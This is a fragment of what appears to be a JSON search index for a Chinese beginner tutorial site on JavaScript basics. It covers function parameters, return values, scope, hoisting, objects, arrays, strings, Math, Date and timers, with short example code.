\"]},{\"header\":\"形参和实参的作用\",\"slug\":\"形参和实参的作用\",\"contents\":[]},{\"header\":\"形参\",\"slug\":\"形参\",\"contents\":[\"形参就是在函数内部可以使用的变量，在函数外部不能使用，每写一个单词，就相当于在函数内部定义了一个可以使用的变量（遵循变量名的命名规则和命名规范），多个单词之间以 , 分隔，如果只有形参的话，那么在函数内部使用的这个变量是没有值的，也就是 undefined\",\"注意：形参的值是在函数调用的时候由实参决定的\",\"// 书写一个参数 function fn(num) { // 在函数内部就可以使用 num 这个变量 } var fn1 = function (num) { // 在函数内部就可以使用 num 这个变量 } // 书写两个参数 function fun(num1, num2) { // 在函数内部就可以使用 num1 和 num2 这两个变量 } var fun1 = function (num1, num2) { // 在函数内部就可以使用 num1 和 num2 这两个变量 } \"]},{\"header\":\"实参\",\"slug\":\"实参\",\"contents\":[\"在函数调用的时候给形参赋值的，也就是说，在调用的时候是给一个实际的内容的\",\"function fn(num) { // 函数内部可以使用 num } // 这个函数的本次调用，书写的实参是 100 // 那么本次调用的时候函数内部的 num 就是 100 fn(100) // 这个函数的本次调用，书写的实参是 200 // 那么本次调用的时候函数内部的 num 就是 200 fn(200) \",\"函数内部的形参的值，由函数调用的时候传递的实参决定，多个参数的时候，是按照顺序一一对应的\",\"function fn(num1, num2) { // 函数内部可以使用 num1 和 num2 } // 函数本次调用的时候，书写的参数是 100 和 200 // 那么本次调用的时候，函数内部的 num1 就是 100，num2 就是 200 fn(100, 200) \"]},{\"header\":\"参数个数的关系\",\"slug\":\"参数个数的关系\",\"contents\":[\"形参比实参少\",\"因为是按照顺序一一对应的\",\"形参少就会拿不到实参给的值，所以在函数内部就没有办法用到这个值\",\"function fn(num1, num2) { // 函数内部可以使用 num1 和 num2 } // 本次调用的时候，传递了两个实参，100 200 和 300 // 100 对应了 num1，200 对应了 num2，300 没有对应的变量 // 所以在函数内部就没有办法依靠变量来使用 300 这个值 fn(100, 200, 300) \",\"形参比实参多\",\"因为是按照顺序一一对应的\",\"所以多出来的形参就是没有值的，就是 undefined\",\"function fn(num1, num2, num3) { // 函数内部可以使用 num1 num2 和 num3 } // 本次调用的时候，传递了两个实参，100 和 200 // 就分别对应了 num1 和 num2 // 而 num3 没有实参和其对应，那么 num3 的值就是 undefined fn(100, 200) \"]},{\"header\":\"arguments对象\",\"slug\":\"arguments对象\",\"contents\":[\"函数内 arguments 表示它接收到的实参列表，它是一个类数组对象\",\"类数组对象：所有属性均为从 0 开始的自然数序列，并且有 length 属性，和数组类似可以用方括号书写下标访问对象的某个属性值，但是不能调用数组的方法\",\"数组的方法详见数组篇\",\"function fun() { console.log(arguments) // 11 22 33 44 console.log(arguments[0]) // 11 console.log(arguments[1]) // 22 console.log(arguments[9]) // undefined } fun(11, 22, 33, 44) \"]},{\"header\":\"函数的return\",\"slug\":\"函数的return\",\"contents\":[\"return 返回的意思，其实就是给函数一个 返回值 和 终断函数\"]},{\"header\":\"返回值\",\"slug\":\"返回值\",\"contents\":[\"函数调用本身也是一个表达式，表达式就应该有一个值出现，现在的函数执行完毕之后，是不会有结果出现的\",\"// 比如 1 + 2 是一个表达式，那么 这个表达式的结果就是 3 console.log(1 + 2) // 3 function fn() { // 执行代码 } // fn() 也是一个表达式，这个表达式就没有结果出现 console.log(fn()) // undefined \",\"return 关键字就是可以给函数执行完毕一个结果，我们可以在函数内部使用 return 把任何内容当作这个函数运行后的结果\",\"function fn() { // 执行代码 return 100 } // 此时，fn() 这个表达式执行完毕之后就有结果出现了 console.log(fn()) // 100 \"]},{\"header\":\"终断函数\",\"slug\":\"终断函数\",\"contents\":[\"当我开始执行函数以后，函数内部的代码就会从上到下的依次执行，必须要等到函数内的代码执行完毕，而 return 关键字就是可以在函数中间的位置停掉，让后面的代码不在继续执行\",\"function fn() { console.log(1) console.log(2) console.log(3) // 写了 return 以后，后面的 4 和 5 就不会继续执行了 return console.log(4) console.log(5) } // 函数调用 fn() \"]},{\"header\":\"作用域\",\"slug\":\"作用域\",\"contents\":[\"变量不是在所有地方都可以使用的，而这个变量的使用范围就是作用域\"]},{\"header\":\"全局作用域\",\"slug\":\"全局作用域\",\"contents\":[\"全局作用域是最大的作用域\",\"在全局作用域中定义的变量可以在任何地方使用\",\"页面打开的时候，浏览器会自动给我们生成一个全局作用域 window\",\"这个作用域会一直存在，直到页面关闭就销毁了\",\"// 下面两个变量都是存在在全局作用域下面的，都是可以在任意地方使用的 var num = 100 var num2 = 200 \"]},{\"header\":\"局部作用域\",\"slug\":\"局部作用域\",\"contents\":[\"局部作用域就是在全局作用域下面有开辟出来的一个相对小一些的作用域\",\"在局部作用域中定义的变量只能在这个局部作用域内部使用\",\"在 JS 中只有函数能生成一个局部作用域，别的都不行\",\"每一个函数，都是一个局部作用域\",\"// 这个 num 是一个全局作用域下的变量 在任何地方都可以使用 var num = 100 function fn() { // 下面这个变量就是一个 fn 局部作用域内部的变量 // 只能在 fn 函数内部使用 var num2 = 200 } fn() \"]},{\"header\":\"变量使用规则\",\"slug\":\"变量使用规则\",\"contents\":[\"有了作用域以后，变量就有了使用范围，也就有了使用规则，变量使用规则分为两种，访问规则 和 赋值规则\"]},{\"header\":\"访问规则\",\"slug\":\"访问规则\",\"contents\":[\"当我想获取一个变量的值的时候，我们管这个行为叫做访问\",\"获取变量的规则：\",\"首先，在自己的作用域内部查找，如果有，就直接拿来使用\",\"如果没有，就去上一级作用域查找，如果有，就拿来使用\",\"如果没有，就继续去上一级作用域查找，依次类推\",\"如果一直到全局作用域都没有这个变量，那么就会直接报错（该变量 is not defined）\",\"var num = 100 function fn() { var num2 = 200 function fun() { var num3 = 300 console.log(num3) // 自己作用域内有，拿过来用 console.log(num2) // 自己作用域内没有，就去上一级，就是 fn 的作用域里面找，发现有，拿过来用 console.log(num) // 自己这没有，去上一级 fn 那里也没有，再上一级到全局作用域，发现有，直接用 console.log(a) // 自己没有，一级一级找上去到全局都没有，就会报错 } fun() } fn() \",\"变量的访问规则 也叫做作用域的查找机制，作用域的查找机制只能是向上找，不能向下找\",\"function fn() { var num = 100 } fn() console.log(num) // 发现自己作用域没有，自己就是全局作用域，没有再上一级了，直接报错 \"]},{\"header\":\"赋值规则\",\"slug\":\"赋值规则\",\"contents\":[\"当你想给一个变量赋值的时候，那么就先要找到这个变量，再给它赋值\",\"变量赋值规则：\",\"先在自己作用域内部查找，有就直接赋值\",\"没有就去上一级作用域内部查找，有就直接赋值\",\"还没有再去上一级作用域查找，有就直接赋值\",\"如果一直找到全局作用域都没有，那么就把这个变量定义为全局变量，再给他赋值\",\"function fn() { num = 100 } fn() // fn 调用以后，要给 num 赋值 // 查看自己的作用域内部没有 num 变量 // 就会向上一级查找 // 上一级就是全局作用域，发现依旧没有 // 那么就会把 num 定义为全局的变量，并为其赋值 // 所以 fn() 以后，全局就有了一个变量叫做 num 并且值是 100 console.log(num) // 100 \"]},{\"header\":\"函数提升\",\"slug\":\"函数提升\",\"contents\":[\"声明式函数：会把所有函数声明提升到当前作用域的最前面，只提升函数声明，不提升函数调用\",\"例：\",\"以下代码\",\"fn() console.log(num) function fn() { console.log('我是 fn 函数') } var num = 100 \",\"经过预解析之后可以变形为\",\"function fn() { console.log('我是 fn 函数') } var num fn() console.log(num) num = 100 \",\"赋值式函数会按照 var 关键字的规则进行预解析\"]}]},\"/frontend/javascriptnotes/11-JavaScript%E5%9F%BA%E7%A1%80-%E5%AF%B9%E8%B1%A1.html\":{\"title\":\"JavaScript基础-对象\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"对象是一个复杂数据类型\",\"事实上没有很复杂，只不过是存储了一些基本数据类型的一个集合\",\"var obj = { num: 100, str: 'hello world', boo: true } \",\"这里的 {} 和函数中的 {} 不一样，函数里面的是写代码的，而对象里面是写一些数据的，对象就是一个键值对的集合，{} 里面的每一个键都是一个成员，也就是说，我们可以把一些数据放在一个对象里面，那么他们就互不干扰了，其实就是我们准备一个房子，把我们想要的数据放进去，然后把房子的地址给到变量名，当我们需要某一个数据的时候，就可以根据变量名里面存储的地址找到对应的房子，然后去房子里面找到对应的数据\"]},{\"header\":\"创建对象\",\"slug\":\"创建对象\",\"contents\":[\"字面量的方式创建一个对象\",\"// 创建一个空对象 var obj = {} // 像对象中添加成员 obj.name = 'Jack' obj.age = 18 \",\"内置构造函数的方式创建对象\",\"// 创建一个空对象 var obj = new Object() // 向对象中添加成员 obj.name = 'Rose' obj.age = 20 \",\"Object 是 js 内置给我们的构造函数，用于创建一个对象使用的\"]}]},\"/frontend/javascriptnotes/12-JavaScript%E5%9F%BA%E7%A1%80-%E6%95%B0%E7%BB%84.html\":{\"title\":\"JavaScript基础-数组\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"数组字面理解就是 数字的组合，准确的来说数组是一个 数据的集合\",\"也就是我们把一些数据放在一个盒子里面，按照顺序排好\",\"[1, 2, 3, 'hello', true, false] \"]},{\"header\":\"创建数组\",\"slug\":\"创建数组\",\"contents\":[]},{\"header\":\"字面量创建数组\",\"slug\":\"字面量创建数组\",\"contents\":[\"直接使用 [] 的方式创建一个数组\",\"// 创建一个空数组 var arr1 = [] // 创建一个有内容的数组 var arr2 = [1, 2, 3] \"]},{\"header\":\"内置构造函数创建数组\",\"slug\":\"内置构造函数创建数组\",\"contents\":[\"使用 JS 的内置构造函数 Array 创建一个数组\",\"// 创建一个空数组 var arr1 = new Array() // 创建一个长度为 10 的数组 var arr2 = new Array(10) // 创建一个有内容的数组 var arr3 = new Array(1, 2, 3) \"]},{\"header\":\"数组的长度\",\"slug\":\"数组的长度\",\"contents\":[\"length 表示数组的长度，数组里面有多少个成员，length 就是多少\",\"// 创建一个数组 var arr = [1, 2, 3] console.log(arr.length) // 3 \"]},{\"header\":\"数组的索引\",\"slug\":\"数组的索引\",\"contents\":[\"索引，也叫做下标，是指一个数据在数组里面排在第几个的位置\",\"注意： 在所有的语言里面，索引都是从 0 开始的，在 JS 里面也一样，数组的索引从 0 开始\",\"// 创建一个数组 var arr = ['hello', 'world'] \",\"上面这个数组中，第 0 个 数据就是字符串 hello，第 1 个 数据就是字符串 world，想获取数组中的第几个就使用 数组[索引] 来获取\",\"var arr = ['hello', 'world'] console.log(arr[0]) // hello console.log(arr[1]) // world \"]},{\"header\":\"数组的常用方法\",\"slug\":\"数组的常用方法\",\"contents\":[]},{\"header\":\"数组常用方法之 push\",\"slug\":\"数组常用方法之-push\",\"contents\":[\"push 是用来在数组的末尾追加一个元素\",\"var arr = [1, 2, 3] // 使用 push 方法追加一个元素在末尾 arr.push(4) console.log(arr) // [1, 2, 3, 4] \"]},{\"header\":\"数组常用方法之 pop\",\"slug\":\"数组常用方法之-pop\",\"contents\":[\"pop 是用来删除数组末尾的一个元素\",\"var arr = [1, 2, 3] // 使用 pop 方法删除末尾的一个元素 arr.pop() console.log(arr) // [1, 2] \"]},{\"header\":\"数组常用方法之 unshift\",\"slug\":\"数组常用方法之-unshift\",\"contents\":[\"unshift 是在数组的最前面添加一个元素\",\"var arr = [1, 2, 3] // 使用 unshift 方法想数组的最前面添加一个元素 arr.unshift(4) console.log(arr) // [4, 1, 2, 3] \"]},{\"header\":\"数组常用方法之 shift\",\"slug\":\"数组常用方法之-shift\",\"contents\":[\"shift 是删除数组最前面的一个元素\",\"var arr = [1, 2, 3] // 使用 shift 方法删除数组最前面的一个元素 arr.shift() console.log(arr) // [2, 3] \"]},{\"header\":\"数组常用方法之 splice\",\"slug\":\"数组常用方法之-splice\",\"contents\":[\"splice 是截取数组中的某些内容，按照数组的索引来截取\",\"语法： splice(从哪一个索引位置开始，截取多少个，替换的新元素) （第三个参数可以不写）\",\"var arr = [1, 2, 3, 4, 5] // 使用 splice 方法截取数组 arr.splice(1, 2) console.log(arr) // [1, 4, 5] \",\"arr.splice(1, 2) 表示从索引 1 开始截取 2 个内容，第三个参数没有写，就是没有新内容替换掉截取位置\",\"var arr = [1, 2, 3, 4, 5] // 使用 splice 方法截取数组 arr.splice(1, 2, '我是新内容') console.log(arr) // [1, '我是新内容', 4, 5] \",\"arr.splice(1, 2, '我是新内容') 表示从索引 1 开始截取 2 个内容，然后用第三个参数把截取完空出来的位置填充\"]},{\"header\":\"数组常用方法之 reverse\",\"slug\":\"数组常用方法之-reverse\",\"contents\":[\"reverse 是用来反转数组使用的\",\"var arr = [1, 2, 3] // 使用 reverse 方法来反转数组 arr.reverse() console.log(arr) // [3, 2, 1] \"]},{\"header\":\"数组常用方法之 sort\",\"slug\":\"数组常用方法之-sort\",\"contents\":[\"sort 是用来给数组排序的\",\"var arr = [2, 3, 1] // 使用 sort 方法给数组排序 arr.sort() console.log(arr) // [1, 2, 3] \"]},{\"header\":\"数组常用方法之 concat\",\"slug\":\"数组常用方法之-concat\",\"contents\":[\"concat 是把多个数组进行拼接\",\"和之前的方法有一些不一样的地方，就是 concat 不会改变原始数组，而是返回一个新的数组\",\"var arr = [1, 2, 3] // 使用 concat 方法拼接数组 var newArr = arr.concat([4, 5, 6]) console.log(arr) // [1, 2, 3] console.log(newArr) // [1, 2, 3, 4, 5, 6] \",\"注意： concat 方法不会改变原始数组\"]},{\"header\":\"数组常用方法之 join\",\"slug\":\"数组常用方法之-join\",\"contents\":[\"join 是把数组里面的每一项内容链接起来，变成一个字符串，可以自己定义每一项之间链接的内容 join(要以什么内容链接)，不会改变原始数组，而是把链接好的字符串返回\",\"var arr = [1, 2, 3] // 使用 join 链接数组 var str = arr.join('-') console.log(arr) // [1, 2, 3] console.log(str) // 1-2-3 \",\"注意： join 方法不会改变原始数组，而是返回链接好的字符串\"]},{\"header\":\"数组常用方法之 indexOf\",\"slug\":\"数组常用方法之-indexof\",\"contents\":[\"indexOf 用来找到数组中某一项的索引\",\"语法： indexOf(你要找的数组中的项)\",\"var arr = [1, 2, 3, 4, 5] // 使用 indexOf 超找数组中的某一项 var index = arr.indexOf(3) console.log(index) // 2 \",\"我们要找的是数组中值为 3 的那一项，返回的就是值为 3 的那一项在该数组中的索引，如果你要找的内容在数组中没有，那么就会返回 -1\",\"var arr = [1, 2, 3, 4, 5] // 使用 indexOf 超找数组中的某一项 var index = arr.indexOf(10) console.log(index) // -1 \",\"你要找的值在数组中不存在，那么就会返回 -1\"]},{\"header\":\"数组常用方法之 forEach\",\"slug\":\"数组常用方法之-foreach\",\"contents\":[\"和 for 循环一个作用，就是用来遍历数组的\",\"语法：arr.forEach(function (item, index, arr) {})\",\"var arr = [1, 2, 3] // 使用 forEach 遍历数组 arr.forEach(function (item, index, arr) { // item 就是数组中的每一项 // index 就是数组的索引 // arr 就是原始数组 console.log('数组的第 ' + index + ' 项的值是 ' + item + '，原始数组是', arr) }) \",\"forEach() 的时候传递的那个函数，会根据数组的长度执行，数组的长度是多少，这个函数就会执行多少回\"]},{\"header\":\"数组常用方法之 map\",\"slug\":\"数组常用方法之-map\",\"contents\":[\"和 forEach 类似，只不过可以对数组中的每一项进行操作，返回一个新的数组，用于处理数据\",\"var arr = [1, 2, 3] // 使用 map 遍历数组 var newArr = arr.map(function (item, index, arr) { // item 就是数组中的每一项 // index 就是数组的索引 // arr 就是原始数组 return item + 10 }) console.log(newArr) // [11, 12, 13] \"]},{\"header\":\"数组常用方法之 filter\",\"slug\":\"数组常用方法之-filter\",\"contents\":[\"和 map 的使用方式类似，按照我们的条件来筛选数组，把原始数组中满足条件的筛选出来，组成一个新的数组返回，如果没有符合条件的元素则返回空数组，它不会影响原数组\",\"var arr = [1, 2, 3] // 使用 filter 过滤数组 var newArr = arr.filter(function (item, index, arr) { // item 就是数组中的每一项 // index 就是数组的索引 // arr 就是原始数组 return item > 1 //筛选条件 }) console.log(newArr) // [2, 3] \",\"我们设置的条件就是 > 1，返回的新数组就会是原始数组中所有 > 1 的项\"]}]},\"/frontend/javascriptnotes/13-JavaScript%E5%9F%BA%E7%A1%80-%E5%AD%97%E7%AC%A6%E4%B8%B2.html\":{\"title\":\"JavaScript基础-字符串\",\"contents\":[{\"header\":\"创建字符串\",\"slug\":\"创建字符串\",\"contents\":[\"我们创建字符串也分为两种方法 字面量 和 构造函数\"]},{\"header\":\"字面量\",\"slug\":\"字面量\",\"contents\":[\"var str = 'hello' \"]},{\"header\":\"构造函数创建\",\"slug\":\"构造函数创建\",\"contents\":[\"var str = new String('hello') \"]},{\"header\":\"字符集\",\"slug\":\"字符集\",\"contents\":[]},{\"header\":\"ASCII 字符集\",\"slug\":\"ascii-字符集\",\"contents\":[\"我们都知道，计算机只能存储 0101010 这样的二进制数字，那么我们的 a ~ z 、A ~ Z 、$ 、@ 之类的内容也有由二进制数字组成的，我们可以简单的理解为， a ~ z 、 A ~ Z、 $ 、 @之类的内容都有一个自己的编号，然后在计算机存储的时候，是存储的这些编号，我们看的时候，也是通过这些编号再解析成我们要看到的内容\"]},{\"header\":\"unicode 编码\",\"slug\":\"unicode-编码\",\"contents\":[\"我们看到了，ASCII 只有这 128 个字符的编码结构，但是因为 ASCII 出现的比较早，而且是美国发明的，早先时候这些内容就够用了，因为存储一些英文的内容，传递一些英文的文章什么的都够用了，那么对于这个世界来说肯定是不够用的，因为我们的汉字没有办法存储，包括一些其他国家的语言也没有办法存储，所以就出现了 unicode 编码，也叫（万国码，统一码），unicode 对照表就是一个和 ASCII 一样的对照表，只不过变得很大很大，因为存储的内容特别的多，而且包含了世界上大部分国家的文字，所以我们的文字和字符现在在存储的时候，都是按照 unicode 编码转换成数字进行存储，我们的 UTF-8 就是一种 8 位的 unicode 字符集\"]},{\"header\":\"字符串的常用方法\",\"slug\":\"字符串的常用方法\",\"contents\":[\"字符串和数组有一个相同的特点，即字符串也是按照索引来排列的\"]},{\"header\":\"charAt\",\"slug\":\"charat\",\"contents\":[\"charAt(索引) 是找到字符串中指定索引位置的内容并返回\",\"var str = 'Jack' // 使用 charAt 找到字符串中的某一个内容 var index = str.charAt(2) console.log(index) // c \",\"因为字符串也是按照索引进行排列的，也是同样从 0 开始，所以索引 2 的位置就是 c\",\"如果没有对应的索引，那么就会返回 空字符串\",\"var str = 'Jack' // 使用 charAt 找到字符串中的某一个内容 var index = str.charAt(10) console.log(index) // '' \",\"这个字符串根本没有索引 10 的位置，所以就会返回一个空字符串 ''\"]},{\"header\":\"charCodeAt\",\"slug\":\"charcodeat\",\"contents\":[\"charCodeAt(索引) 就是返回对应索引位置的 unicode 编码\",\"var str = 'Jack' // 使用 charAt 找到字符串中的某一个内容 var index = str.charCodeAt(0) console.log(index) // 74 \",\"因为 J 在 unicode 对照表里面存储的是 74，所以就会返回 74\"]},{\"header\":\"indexOf\",\"slug\":\"indexof\",\"contents\":[\"indexOf 就是按照字符找到对应的索引\",\"var str = 'Jack' // 使用 indexOf 找到对应的索引 var index = str.indexOf('J') console.log(index) // 0 \",\"因为字符 J 在字符串 Jack 中的索引位置是 0，所以会返回 0\"]},{\"header\":\"substring\",\"slug\":\"substring\",\"contents\":[\"substring 是用来截取字符串使用的\",\"语法： substring(从哪个索引开始，到哪个索引截止)，包含开始索引，不包含结束索引\",\"var str = 'hello' // 01234 // 使用 substring 截取字符串 var newStr = str.substring(1, 3) console.log(newStr) // el \",\"从索引 1 开始，到索引 3 截止，包含前面的索引不包含后面的索引，所以返回的是 el\"]},{\"header\":\"substr\",\"slug\":\"substr\",\"contents\":[\"substr 也是用来截取字符串的\",\"语法：substr(从哪个索引开始，截取多少个)\",\"var str = 'hello' // 01234 // 使用 substr 截取字符串 var newStr = str.substr(1, 3) console.log(newStr) // ell \",\"这个方法和 substring 不一样的是，第二个参数是截取多少个，从索引 1 开始，截取 3 个，所以得到的是 ell\"]},{\"header\":\"toLowerCase 和 toUpperCase\",\"slug\":\"tolowercase-和-touppercase\",\"contents\":[\"这两个方法分别使用用来给字符串转成 小写字母 和 大写字母 的\",\"var str = hello // 使用 toUpperCase 转换成大写 var upper = str.toUpperCase() console.log(upper) // HELLO // 使用 toLowerCase 转换成小写 var lower = upper.toLowerCase() console.log(lower) // hello \"]}]},\"/frontend/javascriptnotes/14-JavaScript%E5%9F%BA%E7%A1%80-Math.html\":{\"title\":\"JavaScript基础-Math\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"Math 是 JS 的一个内置对象，称为数学对象，提供了一堆的属性和方法帮助我们操作 数字\"]},{\"header\":\"常用方法\",\"slug\":\"常用方法\",\"contents\":[]},{\"header\":\"random\",\"slug\":\"random\",\"contents\":[\"Math.random() 这个方法是用来生成一个 0 ~ 1 之间的随机数，每次执行生成的数字都不一样，但是一定是 0 ~ 1 之间的，生成的数字包含 0 ，但是不包含 1\",\"var num = Math.random() console.log(num) // 得到一个随机数 \",\"//生成0~10的随机数 Math.floor(Math.random() * 11) //生成N~M之间的随机数 Math.floor(Math.random() * (M - N + 1)) + N \"]},{\"header\":\"round\",\"slug\":\"round\",\"contents\":[\"Math.round() 是将一个小数 四舍五入 变成一个整数\",\"var num = 10.1 console.log(Math.round(num)) // 10 var num2 = 10.6 console.log(Math.round(num2)) // 11 \"]},{\"header\":\"abs\",\"slug\":\"abs\",\"contents\":[\"Math.abs() 是返回一个数字的 绝对值\",\"var num = -10 console.log(math.abs(num)) // 10 \"]},{\"header\":\"ceil\",\"slug\":\"ceil\",\"contents\":[\"Math.ceil() 是将一个小数 向上取整 得到的整数\",\"var num = 10.1 console.log(Math.ceil(num)) // 11 var num2 = 10.9 console.log(Math.ceil(num2)) // 11 \"]},{\"header\":\"floor\",\"slug\":\"floor\",\"contents\":[\"Math.floor() 是将一个小数 向下取整 的到的整数\",\"var num = 10.1 console.log(Math.floor(num)) // 10 var num2 = 10.9 console.log(Math.floor(num2)) // 10 \"]},{\"header\":\"max\",\"slug\":\"max\",\"contents\":[\"Math.max() 得到的是你传入的几个数字之中 最大 的那个数字\",\"console.log(Math.max(1, 2, 3, 4, 5)) // 5 \"]},{\"header\":\"min\",\"slug\":\"min\",\"contents\":[\"Math.min() 得到的是你传入的几个数字之中 最小 的那个数字\",\"console.log(Math.min(1, 2, 3, 4, 5)) // 1 \"]},{\"header\":\"pow\",\"slug\":\"pow\",\"contents\":[\"Math.pow()求某个数的多少次方\",\"// 求 4 的 2 次方 console.log(Math.pow(4, 2)) // 16 // 求 2 的 3 次方 console.log(Math.pow(2, 3)) // 8 \"]},{\"header\":\"sqrt\",\"slug\":\"sqrt\",\"contents\":[\"Math.sqrt()求某数的平方根\",\"console.log(Math.sqrt(16))// 4 \"]},{\"header\":\"常用属性\",\"slug\":\"常用属性\",\"contents\":[]},{\"header\":\"PI\",\"slug\":\"pi\",\"contents\":[\"Math.PI 得到的是 π 的值，也就是 3.1415936...\",\"console.log(Math.PI) // 3.141592653589793 \",\"因为计算机的计算精度问题，只能得到小数点后 15 位，使用 Math.PI 的时候，是不需要加 () 的\"]}]},\"/frontend/javascriptnotes/15-JavaScript%E5%9F%BA%E7%A1%80-Date.html\":{\"title\":\"JavaScript基础-Date\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"Date对象是JS提供的专门用来获取时间的\"]},{\"header\":\"new Date()\",\"slug\":\"new-date\",\"contents\":[\"new Date() 在不传递参数的情况下是默认返回当前时间\",\"var time = new Date() console.log(time) // 当前时间 Fri Mar 01 2019 13:11:23 GMT+0800 (中国标准时间) \",\"new Date() 在传入参数的时候，可以获取到一个你传递进去的时间\",\"var time = new Date('2019-03-03 13:11:11') console.log(time) // Sun Mar 03 2019 13:11:11 GMT+0800 (中国标准时间) \",\"new Date() 传递的参数有多种情况\",\"传递两个数字，第一个表示年，第二个表示月份\",\"var time = new Date(2019, 00) // 月份从 0 开始计数，0 表示 1月，11 表示 12月 console.log(time) // Tue Jan 01 2019 00:00:00 GMT+0800 (中国标准时间) \",\"传递三个数字，前两个不变，第三个表示该月份的第几天，从 1 到 31\",\"var time = new Date(2019, 00, 05) console.log(time) // Sat Jan 05 2019 00:00:00 GMT+0800 (中国标准时间) \",\"传递四个数字，前三个不变，第四个表示当天的几点，从 0 到 23\",\"var time = new Date(2019, 00, 05, 22) console.log(time) // Sat Jan 05 2019 22:00:00 GMT+0800 (中国标准时间) \",\"传递五个数字，前四个不变，第五个表示的是该小时的多少分钟，从 0 到 59\",\"var time = new Date(2019, 00, 05, 22, 33) console.log(time) // Sat Jan 05 2019 22:33:00 GMT+0800 (中国标准时间) \",\"传递六个数字，前五个不变，第六个表示该分钟的多少秒，从 0 到 59\",\"var time = new Date(2019, 00, 05, 22, 33, 55) console.log(time) // Sat Jan 05 2019 22:33:55 GMT+0800 (中国标准时间) \",\"传入字符串的形式\",\"console.log(new Date('2019')) // Tue Jan 01 2019 08:00:00 GMT+0800 (中国标准时间) console.log(new Date('2019-02')) // Fri Feb 01 2019 08:00:00 GMT+0800 (中国标准时间) console.log(new Date('2019-02-03')) // Sun Feb 03 2019 08:00:00 GMT+0800 (中国标准时间) console.log(new Date('2019-02-03 13:')) // Sun Feb 03 2019 13:00:00 GMT+0800 (中国标准时间) console.log(new Date('2019-02-03 13:13:')) // Sun Feb 03 2019 13:13:00 GMT+0800 (中国标准时间) console.log(new Date('2019-02-03 13:13:13')) // Sun Feb 03 2019 13:13:13 GMT+0800 (中国标准时间) \"]},{\"header\":\"将日期字符串格式化成指定内容\",\"slug\":\"将日期字符串格式化成指定内容\",\"contents\":[\"我们得到的时间字符串是 Sun Feb 03 2019 13:13:13 GMT+0800 (中国标准时间)，我只想得到这个日期中是哪一年，我们就要靠截取字符串的形式得到，但是现在 js 为我们提供了一系列的方法来得到里面的指定内容\"]},{\"header\":\"getFullYear\",\"slug\":\"getfullyear\",\"contents\":[\"getFullYear() 方式是得到指定字符串中的哪一年\",\"var time = new Date(2019, 03, 03, 08, 00, 22) console.log(time.getFullYear()) // 2019 \"]},{\"header\":\"getMonth\",\"slug\":\"getmonth\",\"contents\":[\"getMonth() 方法是得到指定字符串中的哪一个月份\",\"var time = new Date(2019, 03, 03, 08, 00, 22) console.log(time.getMonth()) // 3 \",\"这里要有一个注意的地方，月份是从 0 开始数的，0 表示 1月，1 表示 2月，依此类推\"]},{\"header\":\"getDate\",\"slug\":\"getdate\",\"contents\":[\"getDate() 方法是得到指定字符串中的哪一天\",\"var time = new Date(2019, 03, 03, 08, 00, 22) console.log(time.getDate()) // 3 \"]},{\"header\":\"getHours\",\"slug\":\"gethours\",\"contents\":[\"getHours() 方法是得到指定字符串中的哪小时\",\"var time = new Date(2019, 03, 03, 08, 00, 22) console.log(time.getHours()) // 8 \"]},{\"header\":\"getMinutes\",\"slug\":\"getminutes\",\"contents\":[\"getMinutes() 方法是得到指定字符串中的哪分钟\",\"var time = new Date(2019, 03, 03, 08, 00, 22) console.log(time.getMinutes()) // 0 \"]},{\"header\":\"getSeconds\",\"slug\":\"getseconds\",\"contents\":[\"getSeconds() 方法是得到指定字符串中的哪秒钟\",\"var time = new Date(2019, 03, 03, 08, 00, 22) console.log(time.getSeconds()) // 22 \"]},{\"header\":\"getDay\",\"slug\":\"getday\",\"contents\":[\"getDay() 方法是得到指定字符串当前日期是一周中的第几天（周日是 0，周六是 6）\",\"var time = new Date(2019, 03, 08, 08, 00, 22) console.log(time.getDay()) // 1 \"]},{\"header\":\"getTime\",\"slug\":\"gettime\",\"contents\":[\"getTime() 方法是得到执行时间到 格林威治时间 的毫秒数，即时间戳\",\"var time = new Date(2019, 03, 08, 08, 00, 22) console.log(time.getTime()) // 1554681622000 \",\"其他获取时间戳方法：\",\"+new Date() 方法：\",\"console.log(+new Date()) \",\"now() 方法： 无需实例化，但是只能得到当前的时间戳\",\"console.log(Date.now()) \"]},{\"header\":\"获取时间差\",\"slug\":\"获取时间差\",\"contents\":[\"是指获取两个时间点之间相差的时间，在JS中是不能用时间直接做 减法 的，我们需要一些特殊的操作，在编程的世界里面，有一个特殊的时间，是 1970年01月01日00时00分00秒，这个时间我们叫做 格林威治时间，所有的编程世界里面，这个时间都是一样的，而且 格林威治时间 的数字是 0，从 格林威治时间 开始，每经过1毫秒，数字就会 + 1，所以我们可以获取到任意一个时间节点到 格林威治时间 的毫秒数，然后再用两个毫秒数相减，就能得到两个时间点之间相差的毫秒数，我们再通过这个毫秒数得到准确的时间\"]}]},\"/frontend/javascriptnotes/16-JavaScript%E5%9F%BA%E7%A1%80-%E5%AE%9A%E6%97%B6%E5%99%A8.html\":{\"title\":\"JavaScript基础-定时器\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"在 JS 里面，有两种定时器，倒计时定时器 和 间隔定时器\"]},{\"header\":\"倒计时定时器\",\"slug\":\"倒计时定时器\",\"contents\":[\"倒计时多少时间以后执行函数\",\"语法： setTimeout(要执行的函数，多长时间以后执行)\",\"会在你设定的时间以后，执行函数\",\"var timerId = setTimeout(function () { console.log('我执行了') }, 1000) console.log(timerId) // 1 \",\"时间是按照毫秒进行计算的，1000 毫秒就是 1秒钟，所以会在页面打开 1 秒钟以后执行函数，只执行一次，就不再执行了，返回值是当前这个定时器是页面中的第几个定时器，表示定时器的编号\"]},{\"header\":\"间隔定时器\",\"slug\":\"间隔定时器\",\"contents\":[\"每间隔多少时间就执行一次函数\",\"语法： setInterval(要执行的函数，间隔多少时间)\",\"var timerId = setInterval(function () { console.log('我执行了') }, 1000) \",\"时间和刚才一样，是按照毫秒进行计算的，每间隔 1 秒钟执行一次函数，只要不关闭，会一直执行，返回值是，当前这个定时器是页面中的第几个定时器，表示定时器的编号\"]},{\"header\":\"定时器的返回值\",\"slug\":\"定时器的返回值\",\"contents\":[\"设置定时器的时候，它的返回值是部分 setTimeout 和 setInterval 的\",\"只要有一个定时器，那么就是一个数字\",\"var timerId = setTimeout(function () { console.log('倒计时定时器') }, 1000) var timerId2 = setInterval(function () { console.log('间隔定时器') }, 1000) console.log(timerId) // 1 console.log(timerId2) // 2 